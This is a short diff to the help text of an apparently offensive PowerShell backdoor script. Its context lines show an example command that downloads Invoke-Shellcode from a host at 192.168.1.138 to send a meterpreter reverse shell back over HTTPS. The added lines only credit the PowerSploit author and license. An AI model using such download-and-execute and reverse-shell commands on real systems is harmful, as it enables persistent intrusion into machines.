@@ -25,6 +25,12 @@ PS C:\Users\test\Desktop> Invoke-ADSBackdoor -URL http://192.168.1.138/Invoke-Sh
 This will use the function Invoke-Shellcode in Invoke-Shellcode.ps1 to shovel meterpreter back to 192.168.1.138 on port 
 2222 over HTTPS. 
 
+PowerSploit Function: Invoke-Shellcode
+Author: Matthew Graeber (@mattifestation)
+License: BSD 3-Clause
+Required Dependencies: None
+Optional Dependencies: None
+
 .EXAMPLE
 meterpreter>shell
 Process 4780 created.
